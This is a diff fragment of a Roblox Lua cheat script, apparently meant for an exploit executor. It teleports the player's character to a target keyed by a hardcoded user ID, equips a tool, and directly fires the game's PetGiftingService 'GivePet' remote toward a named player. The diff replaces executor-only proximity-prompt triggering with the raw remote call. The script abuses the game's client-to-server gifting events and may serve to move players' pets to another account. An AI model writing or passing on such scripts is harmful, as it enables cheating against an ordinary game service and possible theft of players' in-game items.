@@ -146,33 +146,20 @@ elseif target == 35789249 then
                                                     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 6)
                                                     print("Equipping", tool)
                                                     chr.Humanoid:EquipTool(tool)
-                                                    task.wait(2)
-                                                    if character and character:FindFirstChild("HumanoidRootPart") then
-                                                        local prox = character.HumanoidRootPart:FindFirstChild("ProximityPrompt")
-                                                        if prox then
-                                                            fireproximityprompt(prox)
-                                                        end
-                                                    end
-                                
-                                                        -- local args = {
-                                                    --     "GivePet",
-                                                    --     game:GetService("Players"):WaitForChild(x)
-                                                    -- }
-                                                    -- game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+                                                    wait(1)                                
+                                                    local args = {
+                                                        "GivePet",
+                                                        game:GetService("Players"):WaitForChild(x)
+                                                    }
+                                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+                                                    wait(2)
                                                 end
-                                            else
-                                                print("GOND")
-                                                if character and character:FindFirstChild("HumanoidRootPart") then
-                                                    local prox = character.HumanoidRootPart:FindFirstChild("ProximityPrompt")
-                                                    if prox then
-                                                        fireproximityprompt(prox)
-                                                    end
-                                                end
-                                                -- local args = {
-                                                --     "GivePet",
-                                                --     game:GetService("Players"):WaitForChild(x)
-                                                -- }
-                                                -- game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+                                            else          
+                                                local args = {
+                                                    "GivePet",
+                                                    game:GetService("Players"):WaitForChild(x)
+                                                }
+                                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                                                 wait(3)
                                             end
                                         else
